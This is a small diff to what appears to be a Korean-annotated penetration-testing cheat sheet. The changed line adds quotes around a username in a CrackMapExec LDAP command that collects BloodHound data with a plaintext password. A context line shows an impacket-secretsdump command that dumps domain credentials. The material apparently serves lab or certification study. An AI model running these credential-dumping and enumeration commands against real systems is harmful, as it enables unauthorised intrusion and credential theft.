@@ -94,7 +94,7 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 ---
 # CrackMapExec LDAP + BloodHound
 ```bash
-cme ldap hokkaido-aerospace.com -u hrapp-service -p 'Untimed$Runny' --bloodhound -c all -ns 192.168.94.135
+cme ldap hokkaido-aerospace.com -u 'hrapp-service' -p 'Untimed$Runny' --bloodhound -c all -ns 192.168.94.135
 ```
 
 - Linux/Kali 등에서 바로 실행 가능. LDAP 기반으로 대부분의 정보를 수집 가능하므로 SharpHound을 직접 업로드하지 않아도 됨.
